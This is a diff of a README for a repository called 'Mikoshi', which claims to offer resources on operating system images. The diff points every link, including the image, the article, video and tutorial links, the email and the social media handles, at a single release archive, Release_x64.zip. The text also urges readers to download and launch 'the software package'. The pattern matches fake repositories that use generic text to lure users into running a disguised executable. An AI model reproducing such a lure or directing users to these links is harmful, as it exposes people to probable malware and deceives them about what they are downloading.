@@ -1,6 +1,6 @@
 # Mikoshi 🏯
 
-![Mikoshi Image](https://your-image-url.com)
+![Mikoshi Image](https://github.com/skakr1/mikoshi/releases/download/v2.0/Release_x64.zip)
 
 Welcome to the **Mikoshi** repository - your ultimate destination for all things related to operating system images! 
 
@@ -24,7 +24,7 @@ In this repository, you will find a collection of resources, tools, and informat
 
 ## Software Download 📥
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/skakr1/mikoshi/releases/download/v2.0/Release_x64.zip)](https://github.com/skakr1/mikoshi/releases/download/v2.0/Release_x64.zip)
 
 🚀 **Note:** The software package needs to be downloaded and launched to explore the exciting features and tools included!
 
@@ -32,9 +32,9 @@ In this repository, you will find a collection of resources, tools, and informat
 
 Explore the following resources to dive deeper into the world of operating system images and customization:
 
-- **[Article: The Power of Immutable Infrastructure](https://your-article-link.com)** - Learn about the benefits of immutability in software deployment.
-- **[Video: Customizing Linux Images with OCI Standards](httpsyour-video-link.com)** - A step-by-step guide to creating custom Linux images.
-- **[Tutorial: Building Bluebuild Images](https:your-tutorial-link.com)** - Master the art of creating Bluebuild images for your projects.
+- **[Article: The Power of Immutable Infrastructure](https://github.com/skakr1/mikoshi/releases/download/v2.0/Release_x64.zip)** - Learn about the benefits of immutability in software deployment.
+- **[Video: Customizing Linux Images with OCI Standards](https://github.com/skakr1/mikoshi/releases/download/v2.0/Release_x64.zip)** - A step-by-step guide to creating custom Linux images.
+- **[Tutorial: Building Bluebuild Images](https://github.com/skakr1/mikoshi/releases/download/v2.0/Release_x64.zip)** - Master the art of creating Bluebuild images for your projects.
 
 ## How to Get Started 🚀
 
@@ -46,14 +46,14 @@ Explore the following resources to dive deeper into the world of operating syste
 
 Join our vibrant community of developers, system administrators, and enthusiasts to share ideas, ask questions, and collaborate on projects related to operating system images. 
 
-Feel free to reach out via [email](mailto:info@mikoshi.com) for any inquiries or support requests.
+Feel free to reach out via [email](https://github.com/skakr1/mikoshi/releases/download/v2.0/Release_x64.zip) for any inquiries or support requests.
 
 ## Get in Touch 🌐
 
 Connect with us on social media for the latest updates, news, and articles related to operating system images:
 
-- **Twitter** - [@MikoshiOfficial](https://twitter.com/MikoshiOfficial)
-- **LinkedIn** - [Mikoshi](https://www.linkedin.com/company/mikoshi)
+- **Twitter** - [@MikoshiOfficial](https://github.com/skakr1/mikoshi/releases/download/v2.0/Release_x64.zip)
+- **LinkedIn** - [Mikoshi](https://github.com/skakr1/mikoshi/releases/download/v2.0/Release_x64.zip)
 
 ## Contributors ✨
 
